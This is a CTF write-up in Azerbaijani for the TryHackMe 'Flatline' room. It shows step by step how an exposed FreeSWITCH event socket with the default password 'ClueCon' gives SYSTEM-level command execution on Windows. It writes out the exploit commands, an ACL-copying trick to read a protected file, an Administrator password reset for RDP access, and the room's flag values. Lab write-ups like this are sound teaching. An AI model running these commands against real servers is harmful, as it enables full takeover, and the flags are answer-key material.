# TryHackMe — Flatline Writeup (Azərbaycanca)

---

## 📋 Otaq Haqqında

**Çətinlik:** Easy  
**Əməliyyat Sistemi:** Windows  
**Mövzu:** FreeSWITCH RCE, Windows icazə idarəetməsi  
**Ssenariy:** Windows serverdə FreeSWITCH servisi işləyir.
Default şifrə dəyişdirilməyib — bu bizim girişimizi təmin edir.

---

## 1. 🔍 Kəşfiyyat (Nmap)

```bash
nmap -sV -sC -p- 10.82.133.199
```

**Tapılan açıq portlar:**

| Port  | Servis | Versiya |
|-------|--------|---------|
| 3389  | RDP | Microsoft Terminal Services |
| 8021  | FreeSWITCH | mod_event_socket |

> ⚠️ **Mühüm:** FreeSWITCH port 8021-də işləyir və
> default şifrəsi **ClueCon**-dur — dəyişdirilməyib!

---

## 2. 🔎 Vulnerability Araşdırması

```bash
searchsploit freeswitch
```

**Tapılan exploit:**
```
FreeSWITCH 1.10.1 - Command Execution | windows/remote/47799.txt
FreeSWITCH - Event Socket Command Execution (Metasploit) | multiple/remote/47698.rb
```

**Exploit-i yüklə:**
```bash
searchsploit -m windows/remote/47799.txt
cp 47799.txt freeswitch.py
```

**Necə işləyir:**
- FreeSWITCH port 8021-də əmrləri qəbul edir
- Default şifrə: `ClueCon`
- Şifrə ilə authenticate olub sistem əmrləri icra etmək mümkündür

---

## 3. ⚡ Exploit — RCE

```bash
# Sistemi yoxla
python3 freeswitch.py 10.82.133.199 'whoami'
```

**Cavab:**
```
Authenticated
nt authority\system
```

> 🎉 Birbaşa **nt authority\system** — Windows-un ən yüksək səlahiyyəti!

---

## 4. 🚩 User Flag

```bash
# Desktop-u listələ
python3 freeswitch.py 10.82.133.199 'dir C:\Users\Nekrotic\Desktop'
```

```bash
# User flag-i oxu
python3 freeswitch.py 10.82.133.199 'type C:\Users\Nekrotic\Desktop\user.txt'
```

🚩 **User Flag:** `THM{64bca0843d535fa73eecdc59d27cbe26}`

---

## 5. 🔐 Root Flag — İcazə Problemi

```bash
# Root flag-i oxumağa çalış
python3 freeswitch.py 10.82.133.199 'type C:\Users\Nekrotic\Desktop\root.txt'
```

**Cavab:**
```
-ERR no reply
```

> ❌ İcazə yoxdur! `root.txt` faylının icazələri məhdudlaşdırılıb.

---

## 6. 🔓 İcazə Problemininin Həlli

**Metod: ACL Kopyalama (Get-Acl | Set-Acl)**

`user.txt`-in icazələrini `root.txt`-ə kopyalayırıq:

```bash
python3 freeswitch.py 10.82.133.199 'powershell -c "Get-Acl c:\Users\Nekrotic\Desktop\user.txt | Set-Acl c:\Users\Nekrotic\Desktop\root.txt"'
```

**İzah:**
```
Get-Acl user.txt  →  user.txt-in icazələrini götür
Set-Acl root.txt  →  həmin icazələri root.txt-ə ver
```

İndi root flag-i oxu:

```bash
python3 freeswitch.py 10.82.133.199 'type C:\Users\Nekrotic\Desktop\root.txt'
```

🚩 **Root Flag:** `THM{8c8bc5558f0f...}`

---

## 7. 🖥️ Bonus — RDP ilə Giriş

FreeSWITCH `nt authority\system` səlahiyyəti verir.
Bu səlahiyyətlə Administrator hesabını aktiv edib RDP ilə girə bilərik:

```bash
# Administrator şifrəsini dəyiş
python3 freeswitch.py 10.82.133.199 'net user Administrator Password123'

# Administrator hesabını aktiv et
python3 freeswitch.py 10.82.133.199 'net user Administrator /active:yes'

# RDP ilə qoşul
xfreerdp /v:10.82.133.199 /u:Administrator /p:Password123 /cert:ignore
```

---

## 8. 🗺️ Tam Attack Chain

```
Nmap skanı
    ↓
Port 8021 — FreeSWITCH aşkar edildi
    ↓
searchsploit → Exploit-DB #47799
    ↓
python3 freeswitch.py → Default şifrə: ClueCon
    ↓
whoami → nt authority\system 👑
    ↓
type user.txt → User Flag 🚩
    ↓
type root.txt → İcazə yoxdur ❌
    ↓
Get-Acl user.txt | Set-Acl root.txt → İcazə verildi ✅
    ↓
type root.txt → Root Flag 🚩
```

---

## 9. 📝 Əsas Öyrənilənlər

| Konsept | İzah |
|---------|------|
| **FreeSWITCH** | VoIP serveri — default şifrəsi ClueCon |
| **Default şifrə** | Dəyişdirilməmiş default şifrə böyük təhlükədir |
| **nt authority\system** | Windows-un ən yüksək səlahiyyəti |
| **Get-Acl / Set-Acl** | Windows fayl icazələrini idarə etmək |
| **RDP** | Uzaqdan Windows masaüstünə giriş |
| **Exploit-DB #47799** | FreeSWITCH RCE exploit |

---

## 10. ⚠️ Mühüm Qeydlər

> **Default şifrələri dəyişin!** FreeSWITCH-in default şifrəsi
> `ClueCon`-dur. Bu dəyişdirilməsəydi exploit mümkün olmazdı.

> **nt authority\system** Windows-da rootdan da yuxarıdır —
> bütün fayllara və proseslərə tam giriş imkanı verir.

---

*Hazırladı: CTF Player | TryHackMe — Flatline*
